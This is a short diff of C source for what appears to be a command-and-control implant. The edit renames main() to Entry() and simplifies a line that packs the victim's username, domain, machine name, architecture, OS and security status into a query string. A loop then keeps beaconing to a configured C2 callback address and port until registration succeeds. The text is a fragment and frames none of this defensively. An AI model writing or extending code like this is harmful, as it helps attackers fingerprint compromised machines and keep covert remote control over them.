@@ -14,7 +14,7 @@
 
 #include "settings.h"
 
-void main()
+void Entry()
 {
     BOOL     Success;
     DWORD    OpCode;
@@ -46,14 +46,8 @@ void main()
     }
 
     // format the data correctly so it can be used when we call back to the c2
-
-    #if !defined(IMPERSONATE_SESSION)
-        sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName, CompInfo.Arch, CompInfo.OS, CompInfo.Secure);
-    #endif
-
-    #if defined(IMPERSONATE_SESSION)
-        sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s&impersonate=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName, CompInfo.Arch, CompInfo.OS, CompInfo.Secure, IMPERSONATE_SESSION);
-    #endif
+    sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
+                                                                                                      CompInfo.Arch, CompInfo.OS, CompInfo.Secure);
 
     // register back with the c2
     while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
